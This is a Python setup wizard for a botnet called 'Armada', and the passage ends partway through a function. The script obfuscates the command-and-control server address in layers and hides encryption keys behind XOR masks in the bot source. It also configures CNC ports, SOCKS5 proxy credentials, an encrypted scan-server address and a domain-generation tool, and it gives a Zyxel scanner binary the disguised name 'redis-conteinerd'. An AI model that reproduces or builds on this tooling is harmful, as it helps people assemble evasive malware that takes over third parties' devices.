#!/usr/bin/env python3
"""
Armada - Interactive Setup Script
=======================================
Automates the complete setup process:
- Generates random protocol version and magic code
- Obfuscates server address using XOR+Base64
- Configures VPE2 encrypted transport
- Updates CNC and proxy agent source code
- Builds all components

Author: Syn2Much
"""

import json
import os
import sys
import re
import random
import string
import base64
import subprocess
import shutil
from datetime import datetime


# ANSI Colors
class Colors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"

    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"

    BRIGHT_RED = "\033[91m"
    BRIGHT_GREEN = "\033[92m"
    BRIGHT_YELLOW = "\033[93m"
    BRIGHT_BLUE = "\033[94m"
    BRIGHT_MAGENTA = "\033[95m"
    BRIGHT_CYAN = "\033[96m"
    BRIGHT_WHITE = "\033[97m"


def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")


def print_banner():
    """Print the setup banner"""
    clear_screen()
    banner = f"""
{Colors.BRIGHT_RED}{Colors.BOLD}
      .o.                                                  .o8            
     .888.                                                "888            
    .8"888.     oooo d8b ooo. .oo.  .oo.    .oooo.    .oooo888   .oooo.   
   .8' `888.    `888""8P `888P"Y88bP"Y88b  `P  )88b  d88' `888  `P  )88b  
  .88ooo8888.    888      888   888   888   .oP"888  888   888   .oP"888  
 .8'     `888.   888      888   888   888  d8(  888  888   888  d8(  888  
o88o     o8888o d888b    o888o o888o o888o `Y888""8o `Y8bod88P" `Y888""8o 
                                                                          
                         the original boatnet                                                
                                                                          
{Colors.RESET}
{Colors.BRIGHT_CYAN}              ═══════════════════════════════════════
                    {Colors.BRIGHT_YELLOW}Interactive Setup Wizard{Colors.BRIGHT_CYAN}
              ═══════════════════════════════════════{Colors.RESET}
"""
    print(banner)


def print_step(step_num: int, total: int, title: str):
    """Print a step header"""
    print(
        f"\n{Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}║{Colors.RESET} {Colors.BRIGHT_YELLOW}Step {step_num}/{total}:{Colors.RESET} {Colors.BRIGHT_WHITE}{title:<47}{Colors.RESET}{Colors.BRIGHT_CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.BRIGHT_CYAN}╚══════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )


def success(msg: str):
    print(f"{Colors.BRIGHT_GREEN}[✓]{Colors.RESET} {Colors.GREEN}{msg}{Colors.RESET}")


def error(msg: str):
    print(f"{Colors.BRIGHT_RED}[✗]{Colors.RESET} {Colors.RED}{msg}{Colors.RESET}")


def info(msg: str):
    print(f"{Colors.BRIGHT_BLUE}[i]{Colors.RESET} {Colors.BLUE}{msg}{Colors.RESET}")


def warning(msg: str):
    print(f"{Colors.BRIGHT_YELLOW}[!]{Colors.RESET} {Colors.YELLOW}{msg}{Colors.RESET}")


def print_info_box(title: str, lines: list):
    """Print a styled information box"""
    width = 62
    print(f"\n{Colors.BRIGHT_BLUE}┌{'─' * width}┐{Colors.RESET}")
    print(
        f"{Colors.BRIGHT_BLUE}│{Colors.RESET} {Colors.BRIGHT_YELLOW}{title:<{width-1}}{Colors.RESET}{Colors.BRIGHT_BLUE}│{Colors.RESET}"
    )
    print(f"{Colors.BRIGHT_BLUE}├{'─' * width}┤{Colors.RESET}")
    for line in lines:
        # Handle empty lines
        if not line:
            print(
                f"{Colors.BRIGHT_BLUE}│{Colors.RESET}{' ' * width}{Colors.BRIGHT_BLUE}│{Colors.RESET}"
            )
        else:
            print(
                f"{Colors.BRIGHT_BLUE}│{Colors.RESET} {line:<{width-1}}{Colors.BRIGHT_BLUE}│{Colors.RESET}"
            )
    print(f"{Colors.BRIGHT_BLUE}└{'─' * width}┘{Colors.RESET}\n")


def prompt(msg: str, default: str = None) -> str:
    """Get user input with styled prompt"""
    if default:
        display = f"{Colors.BRIGHT_MAGENTA}➜{Colors.RESET} {msg} [{Colors.DIM}{default}{Colors.RESET}]: "
    else:
        display = f"{Colors.BRIGHT_MAGENTA}➜{Colors.RESET} {msg}: "

    value = input(display).strip()
    return value if value else default


def confirm(msg: str, default: bool = True) -> bool:
    """Get yes/no confirmation"""
    default_str = "Y/n" if default else "y/N"
    response = (
        input(f"{Colors.BRIGHT_YELLOW}?{Colors.RESET} {msg} [{default_str}]: ")
        .strip()
        .lower()
    )

    if not response:
        return default
    return response in ["y", "yes"]


def generate_magic_code(length: int = 16) -> str:
    """Generate a random magic code with mixed characters"""
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return "".join(random.choice(chars) for _ in range(length))


def generate_protocol_version() -> str:
    """Generate a random protocol version"""
    major = random.randint(1, 5)
    minor = random.randint(0, 9)
    patch = random.randint(0, 99)

    formats = [
        f"v{major}.{minor}",
        f"v{major}.{minor}.{patch}",
        f"proto{major}{minor}",
        f"V{major}_{minor}",
        f"r{major}.{minor}-stable",
    ]
    return random.choice(formats)


def generate_crypt_seed() -> str:
    """Generate random 8-char hex seed for encryption"""
    return "".join(random.choice("0123456789abcdef") for _ in range(8))


def derive_key_py(seed: str) -> bytes:
    """Python implementation of key derivation (must match C charizard()).
    Uses SHA-256 and reads the 32-byte AES key from crypto.c dynamically."""
    import hashlib

    dk = garuda_key()

    h = hashlib.sha256()
    h.update(seed.encode())
    h.update(dk)

    # Add time-invariant entropy
    entropy = bytearray([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE])
    for i in range(len(entropy)):
        entropy[i] ^= (len(seed) + i * 17) & 0xFF
    h.update(bytes(entropy))

    return h.digest()


# Legacy Pokemon function names — kept for reference / dga_predict.go compatibility
KEY_FUNC_NAMES = [
    "mew", "mewtwo", "celebi", "jirachi", "shaymin", "phione",
    "manaphy", "victini", "keldeo", "meloetta", "genesect",
    "diancie", "hoopa", "volcanion", "magearna", "marshadow",
    "zeraora", "meltan", "melmetal", "zarude", "calyrex",
    "enamorus", "ogerpon", "terapagos", "pecharunt", "eternatus",
    "kubfu", "urshifu", "glastrier", "spectrier", "regieleki", "regidrago",
]

# 32 function names for the independent ChaCha20 key
CHACHA_KEY_FUNC_NAMES = [
    "entei", "raikou", "suicune", "lugia", "latias", "latios",
    "kyogre", "groudon", "registeel", "regice", "regirock",
    "uxie", "mesprit", "azelf", "heatran", "cresselia",
    "zacian", "zamazenta", "regigigas", "giratina", "reshiram",
    "zekrom", "landorus", "tornadus", "thundurus", "xerneas",
    "yveltal", "zygarde", "cosmog", "cosmoem", "solgaleo", "lunala",
]

# Multi-op expression recipes: (inner_op, outer_op)
# Each function's recipe is determined by its index % 5
MULTI_OP_RECIPES = [
    ("+", "^"),  # (A + B) ^ C
    ("^", "+"),  # (A ^ B) + C
    ("^", "-"),  # (A ^ B) - C
    ("-", "^"),  # (A - B) ^ C
    ("*", "^"),  # (A * B) ^ C
]



# Op codes for _kb() helper in crypto.go/dga_predict.go array literals
OP_CODES = {'+': '0', '^': '1', '-': '2', '*': '3'}
OP_FROM_CODE = {'0': '+', '1': '^', '2': '-', '3': '*'}

def eval_multi_op(a, op1, b, op2, c):
    """Evaluate (A op1 B) op2 C with byte arithmetic."""
    ops = {
        '+': lambda x, y: (x + y) & 0xFF,
        '-': lambda x, y: (x - y) & 0xFF,
        '*': lambda x, y: (x * y) & 0xFF,
        '^': lambda x, y: x ^ y,
    }
    return ops[op2](ops[op1](a, b), c) & 0xFF


def solve_c_for_target(target, a, b, inner_op, outer_op):
    """Given target, a, b, and ops, compute c such that (a op1 b) op2 c == target."""
    ops = {
        '+': lambda x, y: (x + y) & 0xFF,
        '-': lambda x, y: (x - y) & 0xFF,
        '*': lambda x, y: (x * y) & 0xFF,
        '^': lambda x, y: x ^ y,
    }
    inner = ops[inner_op](a, b)
    # Solve: inner outer_op c == target
    if outer_op == '^':
        return inner ^ target
    elif outer_op == '+':
        return (target - inner) & 0xFF
    elif outer_op == '-':
        return (inner - target) & 0xFF
    elif outer_op == '*':
        # This is harder; just XOR fallback
        return inner ^ target
    return 0


def generate_multi_op_triple(target, index):
    """Generate (a, b, c, inner_op, outer_op) for a given target byte and function index."""
    inner_op, outer_op = MULTI_OP_RECIPES[index % 5]
    a = random.randint(1, 255)
    b = random.randint(1, 255)
    c = solve_c_for_target(target, a, b, inner_op, outer_op)
    # Verify
    assert eval_multi_op(a, inner_op, b, outer_op, c) == target, \
        f"Multi-op verify failed: ({a} {inner_op} {b}) {outer_op} {c} != {target}"
    return a, b, c, inner_op, outer_op


def _read_cpp_xor_array(content: str, name: str) -> bytes:
    """Read a 32-byte XOR-obfuscated array from C++ source (crypto.c).
    Format: static uint8_t name[32] = { 0xAA,0xBB,... };"""
    pat = rf'static uint8_t {name}\[32\]\s*=\s*\{{\s*(.*?)\s*\}};'
    m = re.search(pat, content, re.DOTALL)
    if not m:
        return bytes(32)  # all zeros if not found
    hex_vals = re.findall(r'0x([0-9A-Fa-f]+)', m.group(1))
    return bytes(int(h, 16) for h in hex_vals[:32])


def read_current_key_cpp(crypto_cpp_path: str) -> bytes:
    """Read the current 32-byte AES key from XOR arrays in bot/crypto.c.
    real_key[i] = _rx0[i] ^ _rx1[i]"""
    with open(crypto_cpp_path, "r") as f:
        content = f.read()
    stored = _read_cpp_xor_array(content, "_rx0")
    mask = _read_cpp_xor_array(content, "_rx1")
    return bytes(s ^ m for s, m in zip(stored, mask))


def read_current_chacha_key_cpp(crypto_cpp_path: str) -> bytes:
    """Read the current 32-byte ChaCha20 key from XOR arrays in bot/crypto.c."""
    with open(crypto_cpp_path, "r") as f:
        content = f.read()
    stored = _read_cpp_xor_array(content, "_rx2")
    mask = _read_cpp_xor_array(content, "_rx3")
    return bytes(s ^ m for s, m in zip(stored, mask))


def garuda_key() -> bytes:
    """Return the raw 32-byte AES key. Reads from bot/crypto.c XOR arrays."""
    base_path = os.path.dirname(os.path.abspath(__file__))
    crypto_cpp = os.path.join(base_path, "bot", "crypto.c")
    return read_current_key_cpp(crypto_cpp)


def generate_random_key():
    """Generate a random 32-byte key.
    Returns (key_bytes, None) — triples no longer needed for C++ bot."""
    key_bytes = os.urandom(32)
    return key_bytes, None


# ============================================================================
# C++ BOT KEY PATCHING — patches XOR-obfuscated arrays in bot/crypto.c
# The C++ bot stores keys as: real_key[i] = stored[i] ^ mask[i]
# setup.py generates random mask, computes stored = key ^ mask, patches both
# ============================================================================

def patch_cpp_keys(crypto_cpp_path: str, aes_key: bytes, chacha_key: bytes):
    """Patch the XOR-obfuscated key arrays in the C++ bot's crypto.c.
    For each key: generate random mask, compute stored = key ^ mask, write both."""
    if not os.path.exists(crypto_cpp_path):
        return  # C++ bot not present, skip

    with open(crypto_cpp_path, "r") as f:
        content = f.read()

    def format_array_bytes(data: bytes, per_line: int = 8) -> str:
        """Format bytes as C hex initializer lines."""
        lines = []
        for i in range(0, len(data), per_line):
            chunk = data[i:i+per_line]
            hex_vals = ",".join(f"0x{b:02X}" for b in chunk)
            lines.append(f"    {hex_vals},")
        return "\n".join(lines)

    def patch_array(content: str, sname: str, mname: str, key_bytes: bytes) -> str:
        """Replace a 32-byte array pair with XOR-obfuscated values."""
        mask = os.urandom(32)
        stored = bytes(k ^ m for k, m in zip(key_bytes, mask))

        # Pattern: static uint8_t name[32] = { ... };
        for name, data in [(sname, stored), (mname, mask)]:
            # Match the array declaration with any hex content
            pat = rf'(static uint8_t {name}\[32\] = \{{)\n(.*?)(// patched by setup\.py\n\}};)'
            # Simpler: just match the 4 lines of hex values
            pat = rf'(static uint8_t {name}\[32\] = \{{\n)' + \
                  r'((?:    0x[0-9A-Fa-f]+.*\n){4})' + \
                  r'(\};)'

            new_lines = ""
            for i in range(0, 32, 8):
                chunk = data[i:i+8]
                hex_vals = ",".join(f"0x{b:02X}" for b in chunk)
                new_lines += f"    {hex_vals}, // patched by setup.py\n"

            content = re.sub(pat, rf'\g<1>{new_lines}\3', content)

        return content

    content = patch_array(content, "_rx0", "_rx1", aes_key)
    content = patch_array(content, "_rx2", "_rx3", chacha_key)

    with open(crypto_cpp_path, "w") as f:
        f.write(content)


def encrypt_cpp_config_blobs(config_cpp_path: str, old_aes_key: bytes, new_aes_key: bytes,
                              old_chacha_key: bytes = None, new_chacha_key: bytes = None):
    """Re-encrypt hex blobs in config.c with dual-layer: ChaCha20-Poly1305 AEAD inner + AES-256-CTR outer.

    Decryption tries formats in order (newest first):
      1. AES-CTR outer + ChaCha20-Poly1305 AEAD inner  (current format, tag-verified)
      2. AES-CTR outer + plain ChaCha20 inner           (legacy)
      3. AES-CTR outer + old symmetric ChaCha20 inner   (oldest)
    If ALL decryption attempts fail, the blob is left unchanged and an error is printed.
    This prevents silent corruption from key mismatches.
    """
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
    if not os.path.exists(config_cpp_path):
        return

    with open(config_cpp_path, "r") as f:
        content = f.read()

    old_has_cc20 = old_chacha_key and any(b != 0 for b in old_chacha_key)
    failed_blobs = []

    pattern = r'(static const char\s*\*\s*raw_\w+\s*=\s*")([0-9a-fA-F]*)(";\s*)'

    def replace_blob(m):
        prefix = m.group(1)
        hex_blob = m.group(2)
        suffix = m.group(3)
        if not hex_blob:
            return m.group(0)

        # Extract variable name for error reporting
        name_m = re.search(r'raw_\w+', prefix)
        blob_name = name_m.group(0) if name_m else "unknown"

        plaintext = None

        # Strip AES-CTR outer layer
        try:
            intermediate = aes_ctr_decrypt_with_key(hex_blob, old_aes_key)
        except Exception as e:
            failed_blobs.append((blob_name, f"AES outer decrypt failed: {e}"))
            return m.group(0)

        if old_has_cc20 and intermediate and len(intermediate) > 28:
            # Strategy 1: Try ChaCha20-Poly1305 AEAD (current format)
            # Format: nonce(12) || ciphertext || tag(16)
            try:
                nonce = intermediate[:12]
                ct_tag = intermediate[12:]
                aead = ChaCha20Poly1305(old_chacha_key)
                plaintext = aead.decrypt(nonce, ct_tag, None)
            except Exception:
                pass

            # Strategy 2: Try plain ChaCha20 with SHA256 key (legacy format)
            if plaintext is None:
                try:
                    pt = chacha20_decrypt(intermediate, old_chacha_key)
                    if pt and len(pt) > 0 and all(b < 128 for b in pt[:20]):
                        plaintext = pt
                except Exception:
                    pass

            # Strategy 3: Try old symmetric ChaCha20 with MD5 key (oldest format)
            if plaintext is None:
                try:
                    pt = chacha20_old_symmetric(intermediate, old_chacha_key)
                    if pt and len(pt) > 0 and all(b < 128 for b in pt[:20]):
                        plaintext = pt
                except Exception:
                    pass
        elif not old_has_cc20:
            plaintext = intermediate

        if plaintext is None:
            failed_blobs.append((blob_name, "all decryption strategies failed — keys don't match blob"))
            return m.group(0)

        # Re-encrypt: ChaCha20-Poly1305 AEAD (inner) + AES-256-CTR (outer)
        enc_cc20_key = new_chacha_key if new_chacha_key else old_chacha_key
        nonce = os.urandom(12)
        aead = ChaCha20Poly1305(enc_cc20_key)
        inner = nonce + aead.encrypt(nonce, plaintext, None)
        # AES-CTR outer
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(new_aes_key), modes.CTR(iv))
        encryptor = cipher.encryptor()
        outer = encryptor.update(inner) + encryptor.finalize()
        new_blob = (iv + outer).hex()
        return prefix + new_blob + suffix

    content = re.sub(pattern, replace_blob, content)

    if failed_blobs:
        print(f"\n{Colors.BRIGHT_RED}  [CRITICAL] {len(failed_blobs)} config blob(s) could NOT be decrypted:{Colors.RESET}")
        for name, reason in failed_blobs:
            print(f"    {Colors.RED}✗ {name}: {reason}{Colors.RESET}")
        print(f"  {Colors.YELLOW}Config blobs left unchanged to prevent corruption.{Colors.RESET}")
        print(f"  {Colors.YELLOW}Run setup.py without key rotation, or fix keys first.{Colors.RESET}")
        return

    with open(config_cpp_path, "w") as f:
        f.write(content)


def aes_ctr_encrypt_with_key(plaintext_bytes: bytes, key: bytes) -> str:
    """AES-CTR encrypt, returns hex(IV || ciphertext)."""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
    encryptor = cipher.encryptor()
    ct = encryptor.update(plaintext_bytes) + encryptor.finalize()
    return (iv + ct).hex()


def aes_ctr_decrypt_with_key(hex_blob: str, key: bytes) -> bytes:
    """AES-CTR decrypt from hex(IV || ciphertext)."""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    data = bytes.fromhex(hex_blob)
    if len(data) <= 16:
        return b""
    iv = data[:16]
    ct = data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
    decryptor = cipher.decryptor()
    return decryptor.update(ct) + decryptor.finalize()


def encrypt_config_blobs(config_path: str, old_aes_key: bytes, new_aes_key: bytes,
                         old_chacha_key: bytes = None, new_chacha_key: bytes = None):
    """Re-encrypt all raw hex blobs in config.go with dual-layer AES+ChaCha20.
    Decrypt: AES(old) → ChaCha20(old) → plaintext
    Encrypt: plaintext → ChaCha20(new) → AES(new) → blob
    Handles both legacy (MD5-based) and new (SHA-256, nonce-prepended) ChaCha20 formats.
    """
    with open(config_path, "r") as f:
        content = f.read()

    # Check if old ChaCha20 key is non-zero (existing dual-layer blobs)
    old_has_cc20 = old_chacha_key and any(b != 0 for b in old_chacha_key)

    # Find all hex blob declarations: var rawXxx, _ = hex.DecodeString("...")
    pattern = r'(var raw\w+, _ = hex\.DecodeString\(")([0-9a-fA-F]*)("\))'

    def replace_blob(m):
        prefix = m.group(1)
        hex_blob = m.group(2)
        suffix = m.group(3)
        if not hex_blob:
            return m.group(0)  # skip empty blobs
        # Decrypt old outer layer (AES)
        plaintext = aes_ctr_decrypt_with_key(hex_blob, old_aes_key)
        # Decrypt old inner layer (ChaCha20) if it existed
        if old_has_cc20:
            # Try new-style decrypt first (nonce-prepended SHA-256)
            try:
                pt = chacha20_decrypt(plaintext, old_chacha_key)
                if pt and len(pt) > 0:
                    plaintext = pt
                else:
                    raise ValueError("empty")
            except Exception:
                # Fall back to legacy MD5-based symmetric
                plaintext = chacha20_old_symmetric(plaintext, old_chacha_key)
        # Encrypt new inner layer (ChaCha20)
        if new_chacha_key:
            intermediate = chacha20_encrypt(plaintext, new_chacha_key)
        else:
            intermediate = plaintext
        # Encrypt new outer layer (AES)
        new_blob = aes_ctr_encrypt_with_key(intermediate, new_aes_key)
        return prefix + new_blob + suffix

    content = re.sub(pattern, replace_blob, content)

    with open(config_path, "w") as f:
        f.write(content)


def encrypt_config_blobs_c(config_path: str, old_aes_key: bytes, new_aes_key: bytes,
                           old_chacha_key: bytes = None, new_chacha_key: bytes = None):
    """Re-encrypt all raw hex blobs in config.c (C-style declarations).
    Delegates to encrypt_cpp_config_blobs which handles all encryption formats."""
    encrypt_cpp_config_blobs(config_path, old_aes_key, new_aes_key, old_chacha_key, new_chacha_key)


def dual_layer_encrypt(plaintext: str) -> str:
    """Dual-layer encrypt: ChaCha20-Poly1305 AEAD (inner) then AES-256-CTR (outer).
    Two different keys, two different ciphers.
    Returns hex string of AES_IV(16) || AES_CTR(AEAD_nonce(12) || ciphertext || tag(16))."""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
    base_path = os.path.dirname(os.path.abspath(__file__))
    crypto_cpp = os.path.join(base_path, "bot", "crypto.c")
    aes_key = garuda_key()
    cc20_key = read_current_chacha_key_cpp(crypto_cpp)
    # Inner layer: ChaCha20-Poly1305 AEAD
    nonce = os.urandom(12)
    aead = ChaCha20Poly1305(cc20_key)
    inner = nonce + aead.encrypt(nonce, plaintext.encode(), None)
    # Outer layer: AES-256-CTR
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CTR(iv))
    encryptor = cipher.encryptor()
    outer = encryptor.update(inner) + encryptor.finalize()
    return (iv + outer).hex()


def chacha20_old_symmetric(data: bytes, key: bytes) -> bytes:
    """Old-style ChaCha20 with deterministic nonce (for decrypting legacy blobs).
    Uses MD5-based key expansion — matches the OLD blastoise() before the upgrade."""
    import hashlib
    h1 = hashlib.md5(key).digest()
    h2 = hashlib.md5(key + b"expand").digest()
    chacha_key = h1 + h2
    nonce = b'\x00\x00\x00\x00' + hashlib.md5(key + b"nonce").digest()[:12]
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
    cipher = Cipher(algorithms.ChaCha20(chacha_key, nonce), mode=None)
    enc = cipher.encryptor()
    return enc.update(data) + enc.finalize()


def chacha20_encrypt(data: bytes, key: bytes) -> bytes:
    """ChaCha20 encrypt with random nonce (matches Go blastoise encrypt path).
    Returns: 12-byte-nonce || ciphertext"""
    import hashlib
    # Derive 32-byte key via SHA-256 (matches Go sha256.Sum256)
    chacha_key = hashlib.sha256(key).digest()
    nonce = os.urandom(12)
    # Python cryptography lib needs 16-byte initial value: 4-byte counter (0) + 12-byte nonce
    initial_value = b'\x00\x00\x00\x00' + nonce
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
    cipher = Cipher(algorithms.ChaCha20(chacha_key, initial_value), mode=None)
    enc = cipher.encryptor()
    ct = enc.update(data) + enc.finalize()
    return nonce + ct


def chacha20_decrypt(data: bytes, key: bytes) -> bytes:
    """ChaCha20 decrypt — extract 12-byte nonce prefix, then decrypt."""
    import hashlib
    if len(data) <= 12:
        return b""
    chacha_key = hashlib.sha256(key).digest()
    nonce = data[:12]
    ct = data[12:]
    initial_value = b'\x00\x00\x00\x00' + nonce
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
    cipher = Cipher(algorithms.ChaCha20(chacha_key, initial_value), mode=None)
    dec = cipher.decryptor()
    return dec.update(ct) + dec.finalize()


def obfuscate_c2(c2_address: str, crypt_seed: str) -> str:
    """
    C2 address obfuscation matching C venusaur() decoder:
    1. Append 8-byte HMAC-SHA256 checksum (keyed)
    2. ChaCha20 stream encrypt
    3. XOR with derived key
    4. Base64 encode
    """
    import hashlib, hmac as hmac_mod

    payload = c2_address.encode()
    key = derive_key_py(crypt_seed)

    # HMAC-SHA256 checksum (first 8 bytes, keyed with charizard-derived key)
    mac = hmac_mod.new(key, payload, hashlib.sha256).digest()[:8]
    data = payload + mac

    # ChaCha20 stream encrypt
    encrypted = chacha20_encrypt(data, key)

    # XOR with rotating key
    xored = bytearray(len(encrypted))
    for i in range(len(encrypted)):
        xored[i] = encrypted[i] ^ key[i % len(key)]

    # Base64 encode
    return base64.b64encode(bytes(xored)).decode()


def verify_obfuscation(encoded: str, crypt_seed: str, expected: str) -> bool:
    """Verify by simulating C venusaur() decoder"""
    import hashlib, hmac as hmac_mod

    try:
        # Base64 decode
        layer1 = base64.b64decode(encoded)

        # XOR with rotating key
        key = derive_key_py(crypt_seed)
        layer2 = bytearray(len(layer1))
        for i in range(len(layer1)):
            layer2[i] = layer1[i] ^ key[i % len(key)]

        # ChaCha20 decrypt
        layer3 = chacha20_decrypt(bytes(layer2), key)

        # Verify 8-byte HMAC checksum
        if len(layer3) < 9:
            return False

        payload = bytes(layer3[:-8])
        recv_hmac = bytes(layer3[-8:])
        expected_hmac = hmac_mod.new(key, payload, hashlib.sha256).digest()[:8]

        if recv_hmac != expected_hmac:
            return False

        return payload.decode() == expected
    except Exception as e:
        print(f"Verification error: {e}")
        return False


def update_cnc_main_go(
    cnc_path: str, magic_code: str, protocol_version: str, admin_port: str, c2_ports=None,
    proxy_user=None, proxy_pass=None
):
    """Update the CNC main.go file with new values"""
    main_go_path = os.path.join(cnc_path, "main.go")

    with open(main_go_path, "r") as f:
        content = f.read()

    # Update MAGIC_CODE
    content = re.sub(
        r'MAGIC_CODE\s*=\s*"[^"]*"',
        lambda m: f'MAGIC_CODE       = "{magic_code}"',
        content,
    )

    # Update PROTOCOL_VERSION
    content = re.sub(
        r'PROTOCOL_VERSION\s*=\s*"[^"]*"',
        lambda m: f'PROTOCOL_VERSION = "{protocol_version}"',
        content,
    )

    # Update USER_SERVER_PORT
    content = re.sub(
        r'USER_SERVER_PORT\s*=\s*"[^"]*"',
        lambda m: f'USER_SERVER_PORT = "{admin_port}"',
        content,
    )

    # Update BOT_SERVER_PORTS (comma-separated list of ports)
    if c2_ports:
        ports_str = ",".join(c2_ports)
        content = re.sub(
            r'BOT_SERVER_PORTS?\s*=\s*"[^"]*"',
            lambda m: f'BOT_SERVER_PORTS = "{ports_str}"',
            content,
        )

    # Update default proxy credentials
    if proxy_user is not None:
        content = re.sub(
            r'DEFAULT_PROXY_USER\s*=\s*"[^"]*"',
            lambda m: f'DEFAULT_PROXY_USER = "{proxy_user}"',
            content,
        )
    if proxy_pass is not None:
        content = re.sub(
            r'DEFAULT_PROXY_PASS\s*=\s*"[^"]*"',
            lambda m: f'DEFAULT_PROXY_PASS = "{proxy_pass}"',
            content,
        )

    with open(main_go_path, "w") as f:
        f.write(content)

    return True


def update_bot_debug_mode(bot_path: str, debug_enabled: bool) -> bool:
    """Update the verbose flag and DEBUG define for build.

    g_verbose lives in ds.c (gated by #ifdef DEBUG), so we only need to
    ensure the build passes -DDEBUG.  tools/build.sh reads the DEBUG env
    var; setup.py writes a small .debug marker so build.sh picks it up.
    """
    ds_path = os.path.join(bot_path, "ds.c")
    build_sh = os.path.join(os.path.dirname(bot_path), "tools", "build.sh")
    marker = os.path.join(bot_path, ".debug")
    try:
        # Patch g_verbose default in ds.c (both the #ifdef and #else branches)
        if os.path.exists(ds_path):
            with open(ds_path, "r") as f:
                content = f.read()
            content = re.sub(
                r'int g_verbose\s*=\s*[01]',
                f'int g_verbose = {"1" if debug_enabled else "0"}',
                content,
            )
            with open(ds_path, "w") as f:
                f.write(content)

        # Write/remove .debug marker so build.sh can check it
        if debug_enabled:
            with open(marker, "w") as f:
                f.write("1\n")
        else:
            if os.path.exists(marker):
                os.remove(marker)

        return True
    except Exception as e:
        error(f"Failed to update debug mode: {e}")
        return False


def prompt_debug_mode() -> bool:
    """Prompt user to set debug mode with explanation"""
    print(f"\n{Colors.BRIGHT_CYAN}🔧 Debug Mode{Colors.RESET}")
    print(
        f"{Colors.DIM}   Logs function calls & connections to console (dev only){Colors.RESET}\n"
    )
    return confirm("Would you like to enable debug mode?", default=False)


def update_bot_config(
    bot_path: str,
    magic_code: str,
    protocol_version: str,
    obfuscated_c2: str,
    crypt_seed: str,
):
    """Update the C++ bot config files with new values"""
    # Update constants in bot.h
    hpp_path = os.path.join(bot_path, "headers", "bot.h")
    with open(hpp_path, "r") as f:
        content = f.read()

    content = re.sub(
        r'(#define CONFIG_SEED\s+)"[^"]*"',
        lambda m: f'{m.group(1)}"{crypt_seed}"',
        content,
    )
    content = re.sub(
        r'(#define SYNC_TOKEN\s+)"[^"]*"',
        lambda m: f'{m.group(1)}"{magic_code}"',
        content,
    )
    content = re.sub(
        r'(#define BUILD_TAG\s+)"[^"]*"',
        lambda m: f'{m.group(1)}"{protocol_version}"',
        content,
    )
    with open(hpp_path, "w") as f:
        f.write(content)

    # Update rawServiceAddrs in config.c
    config_cpp_path = os.path.join(bot_path, "config.c")
    with open(config_cpp_path, "r") as f:
        content = f.read()

    enc_service_addrs = dual_layer_encrypt(obfuscated_c2)
    content = re.sub(
        r'(static const char\s*\*\s*raw_service_addrs\s*=\s*")[^"]*"',
        lambda m: f'{m.group(1)}{enc_service_addrs}"',
        content,
    )
    with open(config_cpp_path, "w") as f:
        f.write(content)

    return True


def update_dga_predict(base_path: str, crypt_seed: str, magic_code: str, aes_key: bytes = None):
    """Update tools/dga_predict.go to match bot's DGA parameters."""
    predict_path = os.path.join(base_path, "tools", "dga_predict.go")
    if not os.path.exists(predict_path):
        return

    with open(predict_path, "r") as f:
        content = f.read()

    content = re.sub(
        r'const configSeed\s*=\s*"[^"]*"',
        f'const configSeed = "{crypt_seed}"',
        content,
    )

    with open(predict_path, "w") as f:
        f.write(content)


def update_proxy_credentials(bot_path: str, username: str, password: str):
    """Update the default SOCKS5 proxy credentials in bot/ds.c"""
    hpp_path = os.path.join(bot_path, "ds.c")
    with open(hpp_path, "r") as f:
        content = f.read()
    content = re.sub(
        r'(const char \*default_proxy_user\s*=\s*)"[^"]*"',
        lambda m: f'{m.group(1)}"{username}"',
        content,
    )
    content = re.sub(
        r'(const char \*default_proxy_pass\s*=\s*)"[^"]*"',
        lambda m: f'{m.group(1)}"{password}"',
        content,
    )
    with open(hpp_path, "w") as f:
        f.write(content)


def update_scan_server(bot_path: str, scan_server: str):
    """Update the scan server address in bot/config.c (encrypted blob)"""
    config_cpp_path = os.path.join(bot_path, "config.c")
    with open(config_cpp_path, "r") as f:
        content = f.read()

    if scan_server:
        enc_blob = dual_layer_encrypt(scan_server)
    else:
        enc_blob = ""

    content = re.sub(
        r'(static const char \*raw_scan_server = ")[^"]*"',
        lambda m: f'{m.group(1)}{enc_blob}"',
        content,
    )
    with open(config_cpp_path, "w") as f:
        f.write(content)


def patch_scanner_config(bot_path: str, bins_host: str):
    """Patch scanner binary names in config.c"""
    config_path = os.path.join(bot_path, "config.c")
    with open(config_path, "r") as f:
        content = f.read()

    # Patch zyxel scanner binary name to match tools/build.sh output
    content = re.sub(
        r'(#define SCANNER_ZYXEL_BIN\s+)"[^"]*"',
        lambda m: f'{m.group(1)}"redis-conteinerd"',
        content,
    )

    with open(config_path, "w") as f:
        f.write(content)


def xor_encode_with_key(plaintext: str, key: str) -> str:
    """XOR-encode a string with a key, return as Go string escape sequence"""
    if not plaintext or not key:
        return ""
    key_bytes = key.encode()
    result = []
    for i, ch in enumerate(plaintext.encode()):
        xored = ch ^ key_bytes[i % len(key_bytes)]
        result.append(f"\\x{xored:02x}")
    return "".join(result)


def find_go() -> str:
